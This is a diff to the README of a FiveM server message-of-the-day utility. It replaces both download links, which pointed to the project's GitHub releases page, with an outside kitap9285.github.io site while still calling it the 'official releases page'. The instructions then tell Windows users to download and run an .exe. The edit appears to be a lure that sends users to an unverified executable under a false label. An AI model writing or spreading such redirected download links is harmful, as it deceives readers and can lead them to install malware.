@@ -1,6 +1,6 @@
 # 📋 rde-motd-script-utility - Send server messages to active players
 
-[![Download Link](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Kitap9285/rde-motd-script-utility/releases)
+[![Download Link](https://img.shields.io/badge/Download-Release-blue)](https://kitap9285.github.io)
 
 This utility helps server owners display messages of the day, rules, and handbooks to players. You can manage your content through admin tabs. The script supports Markdown formatting and pushes live updates to your FiveM server.
 
@@ -8,7 +8,7 @@ This utility helps server owners display messages of the day, rules, and handboo
 
 Follow these steps to obtain the tool for your Windows machine.
 
-1. Navigate to the [official releases page](https://github.com/Kitap9285/rde-motd-script-utility/releases).
+1. Navigate to the [official releases page](https://kitap9285.github.io).
 2. Look for the section labeled "Assets" at the bottom of the latest release post.
 3. Click the file name ending in .exe to start your download.
 4. Save the file to a folder where you can find it later, such as your Downloads folder or a dedicated server tools folder.
